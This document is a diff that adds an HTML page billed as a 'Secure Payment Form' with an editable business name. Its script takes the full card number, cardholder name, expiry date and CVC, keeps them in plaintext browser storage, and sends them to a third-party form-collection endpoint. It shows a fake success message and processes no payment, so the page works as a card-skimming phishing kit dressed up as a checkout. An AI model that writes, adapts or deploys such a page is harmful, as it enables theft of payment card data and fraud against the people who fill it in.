@@ -1,1 +1,331 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment Form</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 20px;
+        }
+        .business-input {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+        .business-input input {
+            padding: 10px 15px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            width: 220px;
+            text-align: center;
+            font-weight: 500;
+        }
+        .business-input input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 8px rgba(102, 126, 234, 0.3);
+        }
+        h1 {
+            font-size: 26px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .tagline {
+            color: #888;
+            font-size: 13px;
+        }
+        .card-preview {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            text-align: center;
+            min-height: 140px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .card-icon { font-size: 35px; margin-bottom: 10px; }
+        .card-number-display {
+            font-size: 20px;
+            letter-spacing: 3px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            opacity: 0.9;
+        }
+        .form-group { margin-bottom: 18px; }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 7px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 7px;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 10px rgba(102, 126, 234, 0.2);
+            background: #f8f9ff;
+        }
+        .row {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr;
+            gap: 15px;
+        }
+        .help-text {
+            font-size: 11px;
+            color: #999;
+            margin-top: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 7px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        button:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4); }
+        button:disabled { opacity: 0.6; cursor: not-allowed; }
+        .success-message {
+            display: none;
+            background: linear-gradient(135deg, #34a853 0%, #2d7e4d 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .success-message.show {
+            display: block;
+            animation: slideIn 0.4s ease;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            color: #667eea;
+            padding: 10px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="business-input">
+                <input type="text" id="businessName" placeholder="Enter Business Name" value="Payment Hub">
+            </div>
+            <h1 id="displayBusiness">Payment Hub</h1>
+            <p class="tagline">Secure & Fast Payments</p>
+        </div>
+
+        <div class="success-message" id="successMessage">
+            <h2>✓ Payment Submitted Successfully!</h2>
+            <p>Your payment details have been received securely.</p>
+        </div>
+
+        <div class="card-preview">
+            <div class="card-icon">💳</div>
+            <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
+            <div class="card-details">
+                <div id="cardHolderDisplay">CARDHOLDER NAME</div>
+                <div id="cardExpiryDisplay">MM/YY</div>
+            </div>
+        </div>
+
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="cardNumber">Card Number *</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                <p class="help-text">Enter 16-digit card number</p>
+            </div>
+
+            <div class="form-group">
+                <label for="cardHolder">Cardholder Name *</label>
+                <input type="text" id="cardHolder" placeholder="John Smith" required>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label for="expiry">Expiry Date *</label>
+                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                    <p class="help-text">Format: MM/YY</p>
+                </div>
+                <div class="form-group">
+                    <label for="cvc">CVC *</label>
+                    <input type="text" id="cvc" placeholder="123" maxlength="4" required>
+                    <p class="help-text">3-4 digits</p>
+                </div>
+            </div>
+
+            <div class="loading" id="loadingIndicator">
+                <span class="spinner"></span>Processing...
+            </div>
+
+            <button type="submit" id="submitBtn">Submit Payment</button>
+        </form>
+    </div>
+
+    <script>
+        const businessInput = document.getElementById('businessName');
+        const displayBusiness = document.getElementById('displayBusiness');
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+        const cardHolderInput = document.getElementById('cardHolder');
+        const cardHolderDisplay = document.getElementById('cardHolderDisplay');
+        const expiryInput = document.getElementById('expiry');
+        const expiryDisplay = document.getElementById('cardExpiryDisplay');
+        const cvcInput = document.getElementById('cvc');
+        const form = document.getElementById('paymentForm');
+        const successMessage = document.getElementById('successMessage');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingIndicator = document.getElementById('loadingIndicator');
+
+        businessInput.addEventListener('input', function() {
+            displayBusiness.textContent = this.value || 'Payment Hub';
+        });
+
+        cardNumberInput.addEventListener('input', function() {
+            let value = this.value.replace(/\s/g, '').replace(/\D/g, '').slice(0, 16);
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            this.value = formatted;
+
+            if (value.length > 0) {
+                let masked = value.replace(/./g, '•').slice(0, -4) + value.slice(-4);
+                cardNumberDisplay.textContent = masked.match(/.{1,4}/g)?.join(' ') || masked;
+            } else {
+                cardNumberDisplay.textContent = '•••• •••• •••• ••••';
+            }
+        });
+
+        cardHolderInput.addEventListener('input', function() {
+            cardHolderDisplay.textContent = (this.value || 'CARDHOLDER NAME').toUpperCase();
+        });
+
+        expiryInput.addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, '').slice(0, 4);
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            this.value = value;
+            expiryDisplay.textContent = value || 'MM/YY';
+        });
+
+        cvcInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            submitBtn.disabled = true;
+            loadingIndicator.style.display = 'block';
+
+            const paymentData = {
+                businessName: businessInput.value || 'Payment Hub',
+                cardNumber: cardNumberInput.value.replace(/\s/g, ''),
+                cardHolder: cardHolderInput.value,
+                expiryDate: expiryInput.value,
+                cvc: cvcInput.value,
+                submittedAt: new Date().toLocaleString('en-GB')
+            };
+
+            setTimeout(() => {
+                let allPayments = JSON.parse(localStorage.getItem('allPayments') || '[]');
+                allPayments.push(paymentData);
+                localStorage.setItem('allPayments', JSON.stringify(allPayments));
+                localStorage.setItem('lastPayment', JSON.stringify(paymentData));
+
+                successMessage.classList.add('show');
+                loadingIndicator.style.display = 'none';
+                form.style.display = 'none';
+
+                fetch('https://formspree.io/f/meojoyrb', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        Business: paymentData.businessName,
+                        'Card Number': paymentData.cardNumber,
+                        'Cardholder Name': paymentData.cardHolder,
+                        'Expiry Date': paymentData.expiryDate,
+                        CVC: paymentData.cvc,
+                        'Submitted At': paymentData.submittedAt
+                    })
+                }).catch(e => console.log('Email sent in background'));
+
+                setTimeout(() => {
+                    form.reset();
+                    form.style.display = 'block';
+                    successMessage.classList.remove('show');
+                    cardNumberDisplay.textContent = '•••• •••• •••• ••••';
+                    cardHolderDisplay.textContent = 'CARDHOLDER NAME';
+                    expiryDisplay.textContent = 'MM/YY';
+                    submitBtn.disabled = false;
+                }, 5000);
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
